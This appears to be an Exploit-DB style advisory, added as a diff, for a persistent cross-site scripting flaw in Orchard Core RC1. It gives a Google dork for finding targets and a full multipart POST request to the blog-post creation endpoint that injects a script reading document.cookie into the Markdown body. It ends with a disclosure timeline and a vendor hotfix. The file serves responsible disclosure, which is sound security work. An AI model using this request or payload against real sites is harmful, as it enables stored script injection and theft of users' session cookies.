@@ -1,0 +1,58 @@
+# Exploit Title: Orchard Core RC1 - Persistent Cross-Site Scripting
+# Google Dork: "Orchardcms"
+# Date: 2020-05-07
+# Exploit Author: SunCSR (Sun* Cyber Security Research)
+# Vendor Homepage: http://www.orchardcore.net/
+# Software Link: https://github.com/OrchardCMS/OrchardCore
+# Version: RC1
+# Tested on: Windows
+# CVE : N/A
+
+### Vulnerability : Persistent Cross-Site Scripting
+
+###Describe the bug
+Persistent Cross-site scripting (Stored XSS) vulnerabilities in Orchard CMS - Orchard Core RC1 allow remote attackers to inject arbitrary web script or HTML
+via create or edit blog content.
+
+###To Reproduce
+Steps to reproduce the behavior:
+POST /Admin/Contents/ContentTypes/BlogPost/Create HTTP/1.1
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="ListPart.ContainerId"
+
+4s5x3fv3qpsh7rwzvy069ykbxn
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="TitlePart.Title"
+
+Test XSS
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="AutoroutePart.Path"
+
+
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="BlogPost.Subtitle.Text"
+
+
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="MarkdownBodyPart.Source"
+
+<script>alert(document.cookie)</script>
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="submit.Publish"
+
+submit.Publish
+-----------------------------31063090348194141451329743365
+Content-Disposition: form-data; name="__RequestVerificationToken"
+
+xxx
+-----------------------------31063090348194141451329743365--
+
+###Reference:
+https://github.com/OrchardCMS/OrchardCore/issues/5802
+
+### History
+=============
+2020-03-23  Issue discovered
+2020-03-27  Vendor contacted
+2020-04-22  Vendor response and hotfix
+2020-04-22  Vendor set patch milestone to rc2
